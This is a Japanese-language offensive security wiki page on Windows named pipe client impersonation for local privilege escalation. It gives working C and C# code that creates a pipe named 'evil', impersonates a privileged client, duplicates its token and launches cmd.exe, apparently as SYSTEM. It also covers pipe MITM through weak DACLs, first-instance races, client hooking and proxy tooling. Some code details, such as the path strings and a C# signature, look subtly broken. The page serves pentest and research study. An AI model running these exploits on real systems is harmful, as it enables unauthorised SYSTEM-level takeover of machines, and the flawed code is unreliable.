# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe Client Impersonation は、named-pipe server thread が接続してきた client の security context を採用できる、local privilege escalation primitive です。実際には、SeImpersonatePrivilege を持つ状態で code を実行できる attacker が、privileged client（例: SYSTEM service）を attacker が制御する pipe に接続させ、ImpersonateNamedPipeClient を呼び出し、生成された token を primary token に duplicate して、client として process を起動します（多くの場合、NT AUTHORITY\SYSTEM）。<sup>[[2]](#references)</sup>

このページでは core technique に焦点を当てます。SYSTEM を自分の pipe に接続させる end-to-end exploit chain については、以下で参照している Potato family のページを確認してください。

## TL;DR
- named pipe を作成する: \\.\pipe\<random>。その後、connection を待機する。
- privileged component（spooler/DCOM/EFSRPC/etc.）に接続させる。
- pipe から少なくとも 1 つの message を読み込んでから、ImpersonateNamedPipeClient を呼び出す。
- current thread から impersonation token を OpenThreadToken し、DuplicateTokenEx(TokenPrimary) で duplicate して、CreateProcessWithTokenW/CreateProcessAsUser により SYSTEM process を取得する。<sup>[[2]](#references)</sup>

## Requirements and key APIs
- calling process/thread に通常必要な privileges:
- 接続してきた client の impersonation を正常に行い、CreateProcessWithTokenW を使用するには SeImpersonatePrivilege。
- 代わりに、SYSTEM を impersonate した後で CreateProcessAsUser を使用できます。この場合、SeAssignPrimaryTokenPrivilege と SeIncreaseQuotaPrivilege が必要になることがあります（SYSTEM を impersonate している場合、これらは満たされます）。
- 使用する core APIs:<sup>[[1]](#references)[[4]](#references)</sup>
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile（impersonation の前に少なくとも 1 つの message を読み込む必要がある）
- ImpersonateNamedPipeClient and RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW or CreateProcessAsUser
- Impersonation level: client が SecurityImpersonation を許可している必要があります。これにより、local で有用な actions を実行できます（多くの local RPC/named-pipe clients ではこれが default です）。pipe を開く際に、client は SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION を使用してこの level を下げることができます。<sup>[[3]](#references)</sup>

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notes:
- ImpersonateNamedPipeClient が ERROR_CANNOT_IMPERSONATE (1368) を返す場合は、まず pipe から読み取りを行い、client が impersonation を Identification level に制限していないことを確認してください。
- SecurityImpersonation および TokenPrimary を指定した DuplicateTokenEx を優先して、process 作成に適した primary token を作成してください。

## .NET クイック例
.NET では、NamedPipeServerStream は RunAsClient を介して impersonation できます。impersonation 後、thread token を duplicate し、process を作成します。
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## SYSTEM を自分の pipe に接続させる一般的な trigger/coercion
これらの technique は、privileged service を named pipe に接続させ、impersonate できるようにします:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

詳細な使用方法と互換性については、こちらを参照してください:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

service trigger から pipe を作成し、impersonate して SYSTEM を spawn する完全な例が必要な場合は、こちらを参照してください:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (ACLs, First-Instance Races, Client Hooking)

privileged service と low-privileged process が `\\.\pipe\...` 経由で通信している場合、その pipe は他の untrusted IPC boundary と同様に扱ってください。classic な server-side impersonation 以外にも、weak pipe ACL、unsafe な creation flags、client-side の trust decision は、local privilege escalation primitive になり得ます。<sup>[[7]](#references)</sup>

### まず candidate pipe を列挙する
- PowerShell から pipe をすばやく一覧表示する: `Get-ChildItem \\.\pipe\`
- Sysinternals の `pipelist64.exe` は、instance counts と single-instance pipe の確認に便利です。
- `SYSTEM` として実行される service が使用する名前、特に helper、updater、launcher、UI broker を優先します。

### permissive DACL と追加 pipe instance による MITM
- privileged server と通信できる process は、すでにその protocol を fuzz し、privileged verb を探せます。<sup>[[7]](#references)</sup>
- より興味深いのは、DACL が pipe object に対して `FILE_GENERIC_WRITE`/`GENERIC_WRITE` を許可している場合です。named pipe では、これは暗黙的に `FILE_CREATE_PIPE_INSTANCE`（`FILE_APPEND_DATA` と同じ bit）を含むため、attacker は同じ名前で別の server instance を作成できます。
- instance は FIFO order で match されるため、attacker が作成した instance と legitimate instance を interleave できます: `CreateNamedPipe` で rogue instance を作成し、続いて `CreateFile` で同じ pipe name を開き、real client が rogue server instance に接続するのを待ちます。
- 結果として、original server process を所有する必要なく、privileged IPC を observe、modify、relay、または desynchronize できます。

### pipe security descriptor に対する first-instance race
- `lpSecurityAttributes` は、pipe name の first instance が作成される場合にのみ DACL を定義します。<sup>[[4]](#references)[[7]](#references)</sup>
- privileged service の起動が遅く、`FILE_FLAG_FIRST_PIPE_INSTANCE` を使用していない場合、attacker は permissive DACL で pipe name を事前作成し、その後 service に attacker が選択した security context で instance を作成させられます。
- これにより service startup が race condition になります: first instance を先に作成し、その後 weakened ACL を利用して client を connect または MITM します。
- defender にとっての mitigation であり、attacker にとっての重要な review point は、`CreateNamedPipe(..., dwOpenMode, ...)` に `FILE_FLAG_FIRST_PIPE_INSTANCE` が含まれているか確認することです。含まれていなければ、service の起動前に pre-creation をテストします。

### PID/signature check は hardening であり boundary ではない
- 一部の product は、`GetNamedPipeClientProcessId`、process image path、または接続 client の Authenticode signer を確認して access を制限しようとします。<sup>[[7]](#references)</sup>
- これは legitimate client に inject するまでしか有効ではありません: trusted process 内に入れば、server が期待する正確な PID/image/signature context を継承します。
- split desktop app では、`SYSTEM` service を直接攻撃するよりも、low-privileged UI/helper process に instrumenting する方が簡単なことがよくあります。

### client の I/O model に応じて hook する
- Synchronous I/O: syscall が buffer を消費する前に `NtWriteFile` を intercept し、`NtReadFile` が return した後に inspect/patch します。<sup>[[7]](#references)</sup>
- Overlapped I/O: `NtReadFile` で確認した `OVERLAPPED`/`IoStatusBlock` を保存し、`GetOverlappedResult` または該当する wait が完了した後に buffer を inspect します。
- Completion port: `GetQueuedCompletionStatus` は `NtRemoveIoCompletion` に到達します。return された `ApcContext` は original read で使用された `OVERLAPPED` に link するため、populate 済みの buffer を見つけるための適切な pivot になります。
- Completion routine (`ReadFileEx`): completion callback は APC として delivery されます。returned data を tamper したり synthetic reply を inject したりする場合は、実際の completion routine を hook し、custom injection には、routine が期待する 3 つの argument を再構成する one-argument `QueueUserAPC` dispatcher を使用します。<sup>[[5]](#references)[[7]](#references)</sup>

### Tooling notes
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) は injected helper DLL 経由で named-pipe traffic を proxy し、editing/replay 用の Burp-like workflow を提供します。<sup>[[6]](#references)</sup>
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe) は Frida-based approach を採用し、`NtReadFile`/`NtWriteFile` と上記の async/completion pivot の hook に重点を置いたうえで、traffic を WebSocket-backed editing workflow に forward します。<sup>[[7]](#references)[[8]](#references)</sup>
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### 運用上の考慮事項
- Named pipes は low-latency であるため、buffers の編集中に長時間 pause すると、脆弱なサービスで deadlock が発生する可能性があります。<sup>[[7]](#references)</sup>
- Overlapped/completion-port/APC-driven clients には、単純な `ReadFile`/`WriteFile` detours とは異なる hooks が必要です。
- 信頼された client への injection は noisy であり、通常は exploit development、protocol reversing、または local lab fuzzing に限定するのが最適です。

## Troubleshooting と注意点
- `ImpersonateNamedPipeClient` を呼び出す前に、pipe から少なくとも1つの message を read する必要があります。そうしないと `ERROR_CANNOT_IMPERSONATE (1368)` が発生します。<sup>[[1]](#references)</sup>
- client が `SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION` を指定して接続した場合、server は完全な impersonation を実行できません。`GetTokenInformation(TokenImpersonationLevel)` を使用して token の impersonation level を確認してください。<sup>[[3]](#references)</sup>
- `CreateProcessWithTokenW` では caller に `SeImpersonatePrivilege` が必要です。`ERROR_PRIVILEGE_NOT_HELD (1314)` で失敗した場合は、すでに SYSTEM を impersonate した後に `CreateProcessAsUser` を使用してください。
- pipe を harden する場合は、pipe の security descriptor が対象 service の接続を許可していることを確認してください。デフォルトでは、`\\.\pipe` 配下の pipes へのアクセスは server の DACL に従います。<sup>[[3]](#references)</sup>

## References

- [1] [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [3] [Microsoft: Named Pipe Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [4] [Microsoft: CreateNamedPipe function](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [5] [Microsoft: Named Pipe Server Using Completion Routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [6] [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [7] [Synacktiv: Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [8] [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
